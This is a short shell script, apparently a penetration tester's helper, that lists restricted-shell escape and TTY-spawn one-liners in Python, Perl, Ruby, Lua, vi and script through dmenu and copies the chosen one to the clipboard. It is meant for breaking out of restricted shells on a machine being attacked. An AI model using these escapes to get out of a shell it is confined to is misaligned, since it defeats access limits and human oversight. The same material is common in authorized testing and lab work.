#!/bin/sh

# -- Just a dmenu wrapper --
# Just some payloads that are
# helping u exit those restricted
# shellZ(spawn a tty) on the box u wanna root
# Created by M4t35Z

# Inspired by: 
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# shell copypasta
## sh
sh_shell="/bin/sh -i"
## python
python1_shell="python3 -c 'import pty; pty.spawn("\""/bin/sh"\"")'"
python2_shell="python3 -c "\""__import__('pty').spawn('/bin/bash')"\"""
python3_shell="python3 -c "\""__import__('subprocess').call(['/bin/bash'])"\"""
## perl
perl1_shell="perl -e 'exec "\""/bin/sh"\"";'"
perl2_shell="perl -e 'print \`/bin/bash\`'"
## ruby
ruby1_shell="exec "\""/bin/sh"\"""
## lua
lua1_shell="os.execute('/bin/sh')"
## vi
vi1_shell="set shell=/bin/bash"
## script
script1_shell="/usr/bin/script -qc /bin/bash /dev/null"

# ---

# texts
sh_text="sh -> $sh_shell"
python1_text="py1 (basic pty + sh) -> $python1_shell"
python2_text="py2 (__ escape + bash) -> $python2_shell"
python3_text="py3 (subprocess + bash) -> $python3_shell"
perl1_text="pl1 (sh) -> $perl1_shell"
perl2_text="pl2 (\` + bash) -> $perl2_shell"
ruby1_text="rb1 -> $ruby1_shell"
lua1_text="lua1 -> $lua1_shell"
vi1_text="vi (to command mode :D) -> $vi1_shell"
script1_text="script -> $script1_shell"

# ---

case "$(printf "$sh_text\\n$python1_text\\n$python2_text\\n$python3_text\\n$perl1_text\\n$perl2_text\\n$ruby1_text\\n$lua1_text\\n$vi1_text\\n$script1_text" | dmenu -l 10 -i -p "L1573n3rZ")" in

    "$sh_text") echo -n "$sh_shell" | xclip -selection clipboard ;;
    "$python1_text") echo -n "$python1_shell" | xclip -selection clipboard ;;
    "$python2_text") echo -n "$python2_shell" | xclip -selection clipboard ;;
    "$python3_text") echo -n "$python3_shell" | xclip -selection clipboard ;;
    "$perl1_text") echo -n "$perl1_shell" | xclip -selection clipboard ;;
    "$perl2_text") echo -n "$perl2_shell" | xclip -selection clipboard ;;
    "$ruby1_text") echo -n "$ruby1_shell" | xclip -selection clipboard ;;
    "$lua1_text") echo -n "$lua1_shell" | xclip -selection clipboard ;;
    "$vi1_text") echo -n "$vi1_shell" | xclip -selection clipboard ;;
    "$script1_text") echo -n "$script1_shell" | xclip -selection clipboard ;;
esac
